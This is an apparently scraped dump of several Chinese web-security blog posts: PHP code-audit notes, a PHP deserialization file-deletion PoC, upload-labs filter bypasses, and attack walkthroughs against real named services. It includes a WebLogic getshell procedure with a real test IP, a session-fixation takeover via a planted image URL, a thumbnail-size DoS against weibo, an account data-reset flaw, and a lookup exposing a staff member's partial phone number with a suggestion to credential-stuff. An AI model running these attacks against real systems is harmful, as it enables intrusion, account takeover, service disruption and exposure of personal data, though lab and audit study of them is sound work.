可以是任何能作为数组索引的值。 str_ireplace过滤sql语句：此函数用法：将 whoami? 中的 whoami 被 iamfree 替换，也就是说把whoami?里的whoami替换成iamfree所以结果就是iamfree? 这里其实是可以绕过的，比如： 运算符:名称 | 关系 | 示例 | 结果:-:|:-:|:-:and | 与 | $x and $y |如果 $x 和 $y 都为 true，则返回 true。 |or | 或 | $x or $y | 如果 $x 和 $y 至少有一个为 true，则返回 true。xor | 异或 | $x xor $y | 如果 $x 和 $y 有且仅有一个为 true，则返回 true。&amp;&amp; | 与 | $x &amp;&amp; $y | 如果 $x 和 $y 都为 true，则返回 true。|| | 或 | $x ||$y | 如果 $x 和 $y 至少有一个为 true，则返回 true。! | 非 | !$x| 如果 $x 不为 true，则返回 true。 变量覆盖: 难一点的： 1&lt;?php 2 foreach (array( &#39;_GET&#39;,&#39;_POST&#39; ) as $key &#x3D;&gt; $value) &#123;3 foreach ($$value as $_key &#x3D;&gt; $_value)&#123;4 echo $_key.&#39;:&#39;.$_value;5 echo &quot;&lt;br &gt;&quot;;6 &#125;7 &#125;8?&gt; 执行后的结果： define()用法: 1&lt;?php 2 define(&#39;t&#39;,time()); &#x2F;&#x2F;把time()的返回值定义为常量(t) 3 echo t;4?&gt; 三元表达式: 1&lt;?php23 $name &#x3D; !empty($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : &#39;此人无名&#39;; &#x2F;&#x2F;表示如果$_GET[&#39;name&#39;]不为空的话就返回$_GET[&#39;name&#39;]如果为空就返回 此人无名。4 echo $name;56?&gt; 还可以有一种判断方法： 1&lt;?php 2 echo 1;3 isset($_GET[&#39;name&#39;]) &amp;&amp; exit(&#39;exit&#39;); &#x2F;&#x2F;如果isset($_GET[&#39;name&#39;])为真也就是name这个参数存在的时候，会执行exit(&#39;exit&#39;)，相反，不存在的时候不会执行exit(&#39;exit&#39;) 4 echo 2;5?&gt; name参数不存在时： name参数存在时： nl2br()函数: eval()函数: 1代码2&lt;?php3$string &#x3D; &#39;cup&#39;;4$name &#x3D; &#39;coffee&#39;;5$str &#x3D; &#39;This is a $string with my $name in it.&#39;;6echo $str. &quot;\\n&quot;;7eval(&quot;\\$str &#x3D; \\&quot;$str\\&quot;;&quot;);8echo $str. &quot;\\n&quot;;9?&gt; 输出：This is a $string with my $name in it.This is a cup with my coffee in it. explode()函数: 也就是拆分 copy()函数: copy(source,destination)参数 | 描述:-: | :-:source | 必需。规定要复制的文件。destination | 必需。规定复制文件的目的地。 将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。 trim()函数:移除字符串两侧的空格等特殊字符 strcasecmp()函数: 正则表达式:preg_match()函数: 匹配一下i： 这里的//是定界符 ，之需要二处字符一样就可以，比如== -- ?? 等等 但是有些不能做定位符 比如a到z、A到Z、0到9、空格、\\ 匹配全部英文字母(包括大写)： 替换匹配到的内容: define()函数： 1define(name,value,case_insensitive) 参数 描叙 name 必需。规定常量的名称。 value 必需。规定常量的值。 case_insensitive 可选。规定常量的名称是否对大小写敏感。 若设置为 true，则对变量名大小写不敏感。默认是 false（大小写敏感）。 dirname()函数：dirname(path) 参数 描述 path 必需。规定要检查的路径。 该函数返回去掉文件名后的目录名 iconv()函数：iconv ( in_charset , out_charset , str )将字符串 str 从 in_charset 转换编码到 out_charset。 intval()函数:还可以当防止SQL注入: reset()函数: $$变量覆盖: 还有一个很有趣的： 1&lt;?php23 $g &#x3D; &#39;_GET&#39;;4 $g &#x3D; $$g; &#x2F;&#x2F;这个时候$$g的第二个$与$g的值拼接了变成了$_GET，第一个$变成了$g，所以$g&#x3D;$_GET5 echo $g[&#39;name&#39;];6 7?&gt; isset()函数:检测变量是否已设置并且非 NULLunset()函数:释放给定的变量 parse_ini_file() 解析一个配置文件。 1array parse_ini_file ( string $filename [, bool $process_sections &#x3D; false [, int $scanner_mode &#x3D; INI_SCANNER_NORMAL ]] ) 载入一个由 filename 指定的 ini 文件，并将其中的设置作为一个联合数组返回。 参数 用法 filename 要解析的 ini 文件的文件名。 process_sections 如果将最后的 process_sections 参数设为 TRUE，将得到一个多维数组，包括了配置文件中每一节的名称和设置。process_sections 的默认值是 FALSE。 scanner_mode Can either be INI_SCANNER_NORMAL (default) or INI_SCANNER_RAW. If INI_SCANNER_RAW is supplied, then option values will not be parsed. 返回值： 成功时以关联数组 array 返回设置，失败时返回 FALSE。 urldecode()函数，可能会造成urldecode二次注入： $_FILES用法: is_numeric()函数： 判断是否为数字，是返回1，不是返回空 dvwa的sql注入的impossible等级源码(dvwa的impossible不存在sql注入)：当然 我看不懂这几行: 1$data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );2$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); substr()函数: 1&lt;?php2$rest &#x3D; substr(&quot;abcdef&quot;, -1); &#x2F;&#x2F; 返回 &quot;f&quot;3$rest &#x3D; substr(&quot;abcdef&quot;, -2); &#x2F;&#x2F; 返回 &quot;ef&quot;4$rest &#x3D; substr(&quot;abcdef&quot;, -3, 1); &#x2F;&#x2F; 返回 &quot;d&quot;56$rest &#x3D; substr(&quot;abcdef&quot;, 0, -1); &#x2F;&#x2F; 返回 &quot;abcde&quot;7$rest &#x3D; substr(&quot;abcdef&quot;, 2, -1); &#x2F;&#x2F; 返回 &quot;cde&quot;8$rest &#x3D; substr(&quot;abcdef&quot;, 4, -4); &#x2F;&#x2F; 返回 &quot;&quot;9$rest &#x3D; substr(&quot;abcdef&quot;, -3, -1); &#x2F;&#x2F; 返回 &quot;de&quot;10?&gt; strrpos()函数: 1&lt;?php2$foo &#x3D; &quot;0123456789a123456789b123456789c&quot;;34var_dump(strrpos($foo, &#39;7&#39;, -5)); &#x2F;&#x2F; 从尾部第 5 个位置开始查找5 &#x2F;&#x2F; 结果: int(17)67var_dump(strrpos($foo, &#39;7&#39;, 20)); &#x2F;&#x2F; 从第 20 个位置开始查找8 &#x2F;&#x2F; 结果: int(27)910var_dump(strrpos($foo, &#39;7&#39;, 28)); &#x2F;&#x2F; 结果: bool(false)11?&gt; extract()函数： 常见语法： 1if(empty($a)) $a &#x3D; &#39;hello world&#39;; &#x2F;&#x2F;如果$a为空，那么它的值为hello world 1$s &#x3D; &#39;sys&#39;.&#39;tem&#39;;2$s(&#39;whoami&#39;); &#x2F;&#x2F;返回desktop-a0iqkh2\\iamfree3&#x2F;*这里就是执行了whoami的命令*&#x2F; 匿名函数： 1$C_F &#x3D; create_function(&#39;$name&#39;,&#39;return $name;&#39;); &#x2F;&#x2F;$name的位置是传递什么参数，第二个参数是函数里执行什么代码2echo $C_F(&#39;iamfree&#39;); &#x2F;&#x2F;输出iamfree 回调函数： 1function Func($name)&#123;2 echo &quot;hello $name&quot;;3&#125;4call_user_func(&#39;Func&#39;,&#39;iamfree&#39;); 5&#x2F;*输出:hello iamfree*&#x2F; 1call_user_func(&#39;system&#39;,&#39;whoami&#39;);2&#x2F;*输出：desktop-a0iqkh2\\iamfree*&#x2F; 命令执行函数： exec() — 执行一个外部程序 passthru() — 执行外部程序并且显示原始输出 proc_open() — 执行一个命令，并且打开用来输入/输出的文件指针。 shell_exec() &amp; `` — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。 system() — 执行外部程序，并且显示输出 popen() — 通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。 文件操作函数： copy — 拷贝文件 file_get_contents — 将整个文件读入一个字符串 file_put_contents — 将一个字符串写入文件 file — 把整个文件读入一个数组中 fopen — 打开文件或者 URL move_uploaded_file — 将上传的文件移动到新位置 readfile — 输出文件 rename — 重命名一个文件或目录 rmdir — 删除目录 unlink &amp; delete — 删除文件 任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。不同的函数在不同的场景有不同的作用和不同的利用手法。读取：可以读取配置等文件，拿到key写入：可以写入shell代码相关的内容删除：可以删除.lock文件而可以重新安装覆盖 特殊函数信息泄漏bool phpinfo ([ int $what = INFO_ALL ] )输出 PHP 当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和主值、HTTP头和PHP授权信息(License)。 软连接-读取文件内容bool symlink ( string $target , string $link )symlink() 对于已有的 target 建立一个名为 link 的符号连接。string readlink ( string $path )readlink() 和同名的 C 函数做同样的事，返回符号连接的内容。 环境变量string getenv ( string $varname )获取一个环境变量的值。bool putenv ( string $setting )添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 加载扩展bool dl ( string $library )载入指定参数 library 的 PHP 扩展。 配置相关string ini_get ( string $varname ) 成功时返回配置选项的值。 1string ini_set ( string $varname , string $newvalue )2string ini_alter ( string $varname , string $newvalue ) 设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。void ini_restore ( string $varname )恢复指定的配置选项到它的原始值。 数字判断bool is_numeric ( mixed $var )如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。 数组相关bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。该函数有一个特性，比较之前会进行自动类型转换。in_array($str,$arr)判断$str是否在$arr数组里 变量覆盖如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域：void parse_str ( string $str [, array &amp;$arr ] )本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突：int extract ( array &amp;$var_array [, int $extract_type = EXTR_OVERWRITE [, string $prefix = NULL ]] ) bool mb_parse_str ( string $encoded_string [, array &amp;$result ] )解析 GET/POST/COOKIE 数据并设置全局变量。 由于 PHP 不提供原始 POST/COOKIE 数据，目前它仅能够用于 GET 数据。 它解析了 URL 编码过的数据，检测其编码，并转换编码为内部编码，然后设置其值为 array的 result 或者全局变量。bool import_request_variables ( string $types [, string $prefix ] )将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。 1&lt;?php2$str &#x3D; &quot;first&#x3D;value&amp;arr[]&#x3D;foo+bar&amp;arr[]&#x3D;baz&quot;;34&#x2F;&#x2F; 推荐用法5parse_str($str, $output);6echo $output[&#39;first&#39;]; &#x2F;&#x2F; value7echo $output[&#39;arr&#39;][0]; &#x2F;&#x2F; foo bar8echo $output[&#39;arr&#39;][47]; &#x2F;&#x2F; baz910&#x2F;&#x2F; 不建议这么用11parse_str($str);12echo $first; &#x2F;&#x2F; value13echo $arr[0]; &#x2F;&#x2F; foo bar14echo $arr[1]; &#x2F;&#x2F; baz15?&gt; 列目录array glob ( string $pattern [, int $flags = 0 ] )glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般shell所用的规则一样。不进行缩写扩展或参数替代。var_dump(glob(&#39;c*.php&#39;)); //列出c开头的PHP文件 无参数获取信息返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量:array get_defined_vars ( void )返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的:array get_defined_constants ([ bool $categorize = false ] )返回一个包含所有已定义函数列表的多维数组:array get_defined_functions ( void )返回所有被 include、 include_once、 require 和 require_once:array get_included_files ( void ) rand()函数: $_REQUEST用法： file_exists()函数：检查文件或目录是否存在 exit用法：多处用在install.php里，因为成功安装一次之后就能再一次运行安装了，除非将exit删除了。","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"获取审核或者其他人的手机号","slug":"获取审核或者其他人的手机号","date":"2019-02-11T03:51:49.000Z","updated":"2019-12-31T03:56:07.039Z","comments":true,"path":"2019/02/11/获取审核或者其他人的手机号/","link":"","permalink":"http://yoursite.com/2019/02/11/%E8%8E%B7%E5%8F%96%E5%AE%A1%E6%A0%B8%E6%88%96%E8%80%85%E5%85%B6%E4%BB%96%E4%BA%BA%E7%9A%84%E6%89%8B%E6%9C%BA%E5%8F%B7/","excerpt":"","text":"1、首先，扫到一个站点（https://webmail.guazi.com/owa/auth/logon.aspx），然后打开，看了一下审查元素，发现里面有点东西~ 2、然后打开第一个链接（https://staff.guazi.com/account/unlock） 然后想起了审核大大让我提交的邮箱，如图 1xinxianquan.bsn &lt;xinxianquan.bsn@guazi.com&gt; 然后我把xinxianquan.bsn放进去 我去。。。。，手机号码出来了(虽然有4位是那啥~~) 1188****6271 那么可以去手机号撞库，然后去https://ams.guazi.com/pwd/change来确认","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"cookie可控导致的漏洞","slug":"cookie可控导致的漏洞","date":"2018-12-31T03:15:30.000Z","updated":"2019-12-31T03:19:50.325Z","comments":true,"path":"2018/12/31/cookie可控导致的漏洞/","link":"","permalink":"http://yoursite.com/2018/12/31/cookie%E5%8F%AF%E6%8E%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞利用1、打开站点发现他有一个请求是这样的 你可以操作cookie为任何值，那么好玩的来了~ 首先假设a用户是受害者，然后我（攻击者）诱导a用户打开如下链接 1http:&#x2F;&#x2F;www.xxx.cn&#x2F;web&#x2F;index&#x2F;weiqi?PHPSESSID&#x3D;123321 然后我（攻击者）在本地也打开 1http:&#x2F;&#x2F;www.xxx.cn&#x2F;web&#x2F;index&#x2F;weiqi?PHPSESSID&#x3D;123321 打开后就登录了，其实原理很简单，就是比如这里的系统是用PHPSESSID来验证用户信息的，但是这里PHPSESSID是可控的，所以攻击者可以把受害者的PHPSESSID修改为任何数，然后把自己的PHPSESSID也修改为受害者一样的值就可以登录他们的账号了，是不是很有意思。 漏洞利用加深有一种方法可以让受害者莫名的中招，就比如www.xxx.com可以插入图片，那么我把图片地址改为http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321（也就是&lt;img src=&#39;http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321&#39;&gt;）然后用户一打开www.xxx.com就会在后台加载这个url然后他的cookie就变成了123321，然后攻击者去修改自己的cookie为123321就可以登录他们的账号了。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"图片设计不当可导致服务器卡顿/CPU占满","slug":"图片设计不当可导致服务器卡顿-CPU占满","date":"2018-12-26T04:01:02.000Z","updated":"2019-12-31T04:04:03.178Z","comments":true,"path":"2018/12/26/图片设计不当可导致服务器卡顿-CPU占满/","link":"","permalink":"http://yoursite.com/2018/12/26/%E5%9B%BE%E7%89%87%E8%AE%BE%E8%AE%A1%E4%B8%8D%E5%BD%93%E5%8F%AF%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E9%A1%BF-CPU%E5%8D%A0%E6%BB%A1/","excerpt":"","text":"由诚殷的师傅挖的新思路，原理是图片大的情况下，cpu处理起来占用率很高，会导致网站卡死或崩溃 1、抓包的时候看到一个请求，如下图 发现这里的high和width是可控的，并且返回的数据包很大，如下图 1upload.api.weibo.com&#x2F;2&#x2F;mss&#x2F;msget_thumbnail?fid&#x3D;4293773238406131&amp;high&#x3D;19999&amp;width&#x3D;19999&amp;size&#x3D;19999,19999&amp;source&#x3D;4037146678 请求的时候并且ping，效果如下 可以看到出现了卡顿 那么如果多次请求，服务器就会因为请求的文件太大，导致大量的CPU去运算，然后可能导致服务器卡顿以及崩溃。 不再多次测试，害怕影响的业务，此外，多个这样子的URL都存在，并且high和width都可控。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"php反序列化漏洞","slug":"php反序列化漏洞","date":"2018-12-25T00:20:10.000Z","updated":"2019-12-25T00:24:56.388Z","comments":true,"path":"2018/12/25/php反序列化漏洞/","link":"","permalink":"http://yoursite.com/2018/12/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"介绍首先php反序列化没有想象中的那么难，你要知道什么是类，什么是魔法方法就很好理解的，先不说反序列化的原理这些 序列化基础首先我们要知道什么是类，这个需要你们自己去了解了，所以不多说了（随便介绍一下），见谅～ 1class Cls&#123;23 public $name = '';4 public $age = 0;56 public function print_name()&#123;78 echo 'name is -&gt; '.$this-&gt;name;9 echo \"\\n\";10 echo 'age is -&gt; '.$this-&gt;age;1112 &#125;1314&#125;1516$my = new Cls(); // 实例化Cls类，就想这个变量是指向了Cls类，可以直接用这个变量操作Cls类17$my-&gt;name = 'only_free'; // 类中定义了$name属性但他值为空，所以我这里重新赋值18$my-&gt;age = 18; // 同上19echo $my -&gt; print_name(); // 调用类中的print_name函数 效果： 序列化这个类可以看到这里是成功输出了的，那么我们这里来序列化这个类，只需要使用一个函数即可(serialize函数)，如下 1echo &quot;\\n&quot;.&#39;序列化后到结果：&#39;.serialize($my).&quot;\\n&quot;; 不懂序列化的作用可以空投到此处：https://blog.csdn.net/wy0123/article/details/79345842 反序列化这个序列化的字符我们上面那个被序列化后的值为 1O:3:&quot;Cls&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;only_free&quot;;s:3:&quot;age&quot;;i:18;&#125; 那么，我们如何把这些字符都变回类呢，那么就要用到反序列化了，代码如下 1class Cls&#123;23 public $name = '';4 public $age = 0;56 public function print_name()&#123;78 echo 'name is -&gt; '.$this-&gt;name;9 echo \"\\n\";10 echo 'age is -&gt; '.$this-&gt;age;11 echo \"\\n\";1213 &#125;1415&#125;1617$xlh = 'O:3:\"Cls\":2:&#123;s:4:\"name\";s:9:\"only_free\";s:3:\"age\";i:18;&#125;';18var_dump( unserialize( $xlh ) ); 可以看到我之前定义的类和$name、$age参数都会展示出来的，那么我们再来看下这个反序列化漏洞如何利用 魔术函数介绍 不要想太多为什么他叫魔术函数，其实他就是类中内置（规定好）的函数 首先我们来看看其中一个的__construct()魔术函数可以用来干嘛，代码如下 1&lt;?php23class Cls&#123;45 function __construct()&#123;6 echo &#39;使用了__construct()&#39;;7 &#125;89&#125;1011$cls &#x3D; new Cls();12echo &quot;\\n&quot;; 那么这里很容易看明白的了吧，这个__construct魔术方法就是当有变量new这个类的时候就会自动调用，就是说实例化Cls类就会触发__construct方法，那么我序列化是需要用到这个的，下面来看看～ 更多的魔术函数可以来这里看看：https://www.cnblogs.com/jakentec/p/3806793.html 序列化漏洞利用首先，这里漏洞自我感觉还是挺难挖到的（不是难，而是因为利用条件刻薄），待我一一说来～ 首先我写了一个小案例（代码执行的漏洞），如下 bug.php是存在反序列化漏洞的地方 class.php是定义一个了一个类（等下会讲的） poc.php是构造的poc 复现过程1、我们先来看看class.php这个文件 可以看到这里有一个类，效果是当这个类被消除的时候就会执行这个函数（当php快要执行完后就会消除这个类，就会执行这个函数），那么我们想，如果我们能够执行这个类，并且把文件名变成任意一个文件的话就可以导致任意文件删除漏洞了，对吧，我们继续来看下 2、查看bug.php里的代码 3、我们来构造一个利用的poc 前面我们知道了反序列化是可以执行一个类的对吧，那么好玩的来了，我们就可以构造一个操做Delete的类，并且把他要删除的内容为任意一个存在的文件即可，那么我们可以这样 可以看到我们实例化了类，并且自定义了要删除的文件，然后序列化，并且把序列化的值放入那个反序列化的可控点，我们就可以执行那个删除文件的类，如何我们再自定义文件名，就可以导致任意文件删除了，所以我们现在只要找到反序列（bug.php），然后我们把序列化后的值放上去~ 4、将操作类的代码序列化并且放入可控的反序列化处 1O:6:&quot;Delete&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;&#125; 这个是序列化操作类的值，然后放入bug.php文件里 可以看到，我们成功的执行了删除index.php的代码，所以这里是存在反序列化漏洞造成的任意文件删除漏洞~ 案例下载地址： 1链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vbldBSypdozwbqBEYwu1tQ 密码: 6666 总结所以，反序列化漏洞需要找到一个反序列化可控点，然后找里面类是否使用魔术函数以及类中是否可操作~","categories":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"weblogic getshell","slug":"getshell","date":"2018-12-21T10:57:24.000Z","updated":"2019-12-21T10:59:25.879Z","comments":true,"path":"2018/12/21/getshell/","link":"","permalink":"http://yoursite.com/2018/12/21/getshell/","excerpt":"","text":"测试地址：http://60.166.38.218:7001 测试是否为weblogic方法一这个是最直观的办法，也就是看404、403页面，如下图就是weblogic特定的404页面，虽然输入一个不存在的文件名就可以看到 如下是weblogic特定的403版本 方法二访问其管理控制台/console/目录 方法三开放7001, 7002, 等特定weblogic常用端口 方法四特定返回包头部信息，如 1Servlet&#x2F;x.x JSP&#x2F;x.x 方法四存在/wls-wsat/目录，如 1http:&#x2F;&#x2F;xx.xxx.xx:7001&#x2F;wls-wsat&#x2F;CoordinatorPortType 方法五这个是weblogic ssrf，链接如下 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;http:&#x2F;&#x2F;localhost&#x2F;robots.txt&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search 这里用第一种办法就测试出来了，如何拿去工具哪儿连接试试~ 确认可以执行命令等操作之后就要定位war包 定位war包 为何要定位war包？因为我们要上传文件，而我们把文件上传到web路径是无法访问的，上传到war包才能够进行访问，导致getshell 网上有很多很复杂的，用下面这个方法挺简单的~ 首先用如下命令找所有的war包里存在的index.html的路径 1locate war&#x2F;index.html 然后就2个，经过测试发现第一个是正确的路径（这样子测试的：每个路径下都去上传文件，然后看看能不能打开~） 1&#x2F;home&#x2F;weblogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;index.html 然后在这个路径下上传个test.txt，内容为hello world，如图 然后访问 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;bea_wls_internal&#x2F;test.txt 补充知识点特定版本的话可以直接getshell，因为特定版本的war包就是在下面这路径 1&#x2F;home&#x2F;weblogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F; 然后直接上传直接访问 1http:&#x2F;&#x2F;xxx.xxx.xxx:7001&#x2F;bea_wls_internal&#x2F;文件名 就可以了","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"猎豹浏览器个人中心逻辑错误导致重置用户数据","slug":"猎豹浏览器个人中心逻辑错误导致重置用户数据","date":"2018-12-21T04:22:23.000Z","updated":"2019-12-31T04:22:46.249Z","comments":true,"path":"2018/12/21/猎豹浏览器个人中心逻辑错误导致重置用户数据/","link":"","permalink":"http://yoursite.com/2018/12/21/%E7%8C%8E%E8%B1%B9%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AA%E4%BA%BA%E4%B8%AD%E5%BF%83%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E9%87%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE/","excerpt":"","text":"这个漏洞只能是只绑定了QQ的，就是只用QQ登陆的用户 1、打开Url：http://i.liebao.cn/，首先来确认下这个是保存了数据的，如图 可以看到这些都是存在的，那么来看我是如何来重置的~ 点击上图的已关联 2、点击取消关联并且抓包 这里要抓对包来~那么我抓到的包在下面： 1POST &#x2F;account&#x2F;qqunbin HTTP&#x2F;1.12Host: i.ijinshan.com3User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2227.0 Safari&#x2F;537.364Accept: *&#x2F;*5Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18X-Requested-With: XMLHttpRequest9Referer: http:&#x2F;&#x2F;i.ijinshan.com&#x2F;liebao&#x2F;unbind_qq?act&#x3D;unqq_f&amp;pp&#x3D;kswl714700207&amp;sid&#x3D;25664df22557c34fc31e781ab241433610Content-Length: 011Content-Type: text&#x2F;plain;charset&#x3D;UTF-812Cookie: PHPSESSID&#x3D;dnndrfci414m8bc7cpu2o56b2413Connection: close 也就是Url： 1i.ijinshan.com&#x2F;account&#x2F;qqunbin 直接访问上图的Url会取消绑定QQ，如下 注意：这里解绑后重新登陆才可以（感觉是个bug，解绑了不是立马显示出来还要重新登陆） 3、重新登陆 用刚刚被解绑的qq账号重新登陆一下，会来到这个页面 然后点击自动创建（因为这个账号没了，所以可以自动创建） 4、登陆后查看效果 ok，没了","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"upload-labs通关笔记","slug":"upload-labs通关笔记","date":"2018-12-18T01:14:58.000Z","updated":"2019-12-18T01:15:48.909Z","comments":true,"path":"2018/12/18/upload-labs通关笔记/","link":"","permalink":"http://yoursite.com/2018/12/18/upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","excerpt":"","text":"第一关： 可以看到这里的上传的验证是javascript验证的，也就是前台认证，但是我们可以利用后台验证绕过。 步骤：1、上传一个2.png2、抓包将2.png修改为2.php 然后看看是否成功上传 upload目录是这个靶机上传的文件的存放目录，所以上传的东西都会在这里，所以看有没有成功上传的话可以直接来这里看，或者去访问一下http://xxx.xxx.xxx/upload/文件名，如我刚刚上传的2.php就是这个链接 http://127.0.0.1/upload/upload/2.php 第二关： 所谓文件类型就是上传文件的时候请求中的Content-Type，如下 这关的代码逻辑就是，如果上传的文件类型是image/jpeg或image/png或image/gif就可以上传。那么只要上传一个php文件，然后把文件类型修改为image/jpeg即可上传 成功上传~ 第三关： 此关就是后台禁止php、jsp、asp、aspx这四个文件上传 这关的代码比较长，我就直接贴出来了~ 1$is_upload = false;2$msg = null;3if (isset($_POST['submit'])) &#123;4 if (file_exists(UPLOAD_PATH)) &#123;5 $deny_ext = array('.asp','.aspx','.php','.jsp');6 $file_name = trim($_FILES['upload_file']['name']);7 $file_name = deldot($file_name);//删除文件名末尾的点8 $file_ext = strrchr($file_name, '.'); // 获取文件名的后缀（就是获取.后面的内容）9 $file_ext = strtolower($file_ext); //转换为小写10 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA11 $file_ext = trim($file_ext); //收尾去空1213 if(!in_array($file_ext, $deny_ext)) &#123; // 如果$file_ext的值不在$deny_ext列表里，即进入条件14 $temp_file = $_FILES['upload_file']['tmp_name'];15 $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; 16 if (move_uploaded_file($temp_file,$img_path)) &#123;17 $is_upload = true;18 &#125; else &#123;19 $msg = '上传出错！';20 &#125;21 &#125; else &#123;22 $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';23 &#125;24 &#125; else &#123;25 $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';26 &#125;27&#125; 既然不能上传php，那么我们可以上传.php3（在某些环境下php3也是当php解析，介绍文章：https://www.cnblogs.com/natian-ws/p/7265806.html） 然后看看是否上传了 可以看到是上传了的，但是为什么名字会那么长呢？可以看看代码中第15行 1$img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; 这个$img_path就是上传后的文件的地址，UPDATE_PATH就是上传目录(upload)，data(&quot;YmdHis&quot;)就是当前时间的年月日时分秒，rand(1000,9999)就是在0000到9999中随机抽数字，$file_ext就是上传的文件的后缀，所以拼接起来就是这么长的名字。 那么我们上传了这个文件后，看不到他的名字，我们就可以爆破当前时间的年月日时分秒，然后后面几个随机数字爆破，这里不演示了，直接打开看看php3是否和php效果一样~ 